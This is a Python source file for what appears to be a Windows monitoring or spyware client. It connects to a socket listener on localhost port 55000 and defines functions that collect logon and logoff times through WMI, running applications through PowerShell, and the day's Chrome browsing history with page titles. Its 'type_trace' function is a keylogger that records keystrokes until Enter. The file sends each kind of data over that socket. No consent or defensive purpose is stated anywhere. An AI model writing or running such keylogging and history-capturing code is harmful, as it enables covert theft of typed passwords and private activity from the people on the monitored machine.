import win32com.client
import subprocess
from browser_history.browsers import Chrome
import datetime
from googletrans import Translator
import cloudscraper
from bs4 import BeautifulSoup
import requests
import keyboard
from socket import *

sock = socket(AF_INET,SOCK_STREAM)
sock.connect(("localhost",55000))

visited_websites = []

def get_buffer(data):
    length = len(data)
    count = 0

    while length != 0:
        length = int(length/10)
        count+=1

    buffer = (5-count)*'0' + f'{len(data)}'
    return buffer

def convert_to_human_time(dtmDate):
    strDateTime = ""
    
    if dtmDate[6] == 0:
        strDateTime = f"{dtmDate[7]}/"
    else:
        strDateTime = f"{dtmDate[6]}{dtmDate[7]}/"

    if dtmDate[4] == 0:
        strDateTime = f"{strDateTime}{dtmDate[5]}/"
    else:
        first_segment = f"{strDateTime}{dtmDate[4]}{dtmDate[5]}/"
        second_segment = f"{dtmDate[0]}{dtmDate[1]}{dtmDate[2]}{dtmDate[3]} {dtmDate[8]}{dtmDate[9]}:{dtmDate[10]}{dtmDate[11]}"
        strDateTime = f"{first_segment}{second_segment}"
    
    return strDateTime

def get_logon_logoff():
    strComputer = "."
    objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
    objSWbemServices = objWMIService.ConnectServer(strComputer, "root\cimv2")
    colItems = objSWbemServices.ExecQuery(
        "SELECT * FROM Win32_NetworkLoginProfile")

    for objItem in colItems:

        if objItem.LastLogon is not None:
            print(objItem.LastLogon)
            logon = convert_to_human_time(objItem.LastLogon)
            print(f"Last Logon: {logon}")

        if objItem.LastLogoff is not None:
            logoff = convert_to_human_time(objItem.LastLogoff)
            print(f"Last Logoff (Human Readable Format): {logoff}")


def get_running_apps():
    apps = []
    NOT_WANTED_APPS = 'Description-----------Application Frame Host'
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)

    for line in proc.stdout:
        
        if line.rstrip() and line.decode().rstrip() not in NOT_WANTED_APPS:
            # only print lines that are not empty
            # decode() is necessary to get rid of the binary string (b')
            # rstrip() to remove `\r\n`
            apps.append(line.decode().rstrip())

    apps = '#'.join(apps)
    buffer = get_buffer(apps)
    sock.send(buffer.encode())
    sock.send(f"new_apps:{apps}".encode())

def get_tabs():
    c = Chrome()
    outputs = c.fetch_history()

    # his is a list of (datetime.datetime, url) tuples
    his = outputs.histories
    websites = []
    today = datetime.datetime.today()
    today = today.strftime("%d/%m/%Y")

    for tab in his:
        date = tab[0].strftime('%d/%m/%Y')
        if date == today:
            websites.append(tab[1])
    
    websites = [f"{url} {get_website_title(url)}" for url in websites]

    websites = '#'.join(websites)

    buffer = get_buffer(websites)
    sock.send(buffer.encode())
    sock.send(f"new_websites:{websites}".encode())
    
def get_website_title(url):    
    # making requests instance
    reqs = requests.get(url)
    
    # using the BeautifulSoup module
    soup = BeautifulSoup(reqs.text, 'html.parser')
    
    return soup.find_all('title')[0].get_text()

def type_trace():
    
    recorded = keyboard.record(until='enter')
    all_keys = [key.name for key in recorded if key.event_type == "down"]
    all_keys.pop(-1)
    all_keys = ''.join(all_keys)
    all_keys = all_keys.replace('space', ' ')

    buffer = get_buffer(all_keys)
    sock.send(buffer.encode())
    sock.send(f"new_text:{all_keys}".encode())


# translator = Translator()

# try:
#         translation = translator.translate(allthecontent).texrt
#         translation = str(translation)[0:999]
#         time.sleep(10)
        
# except Exception as e:
#         print(e)


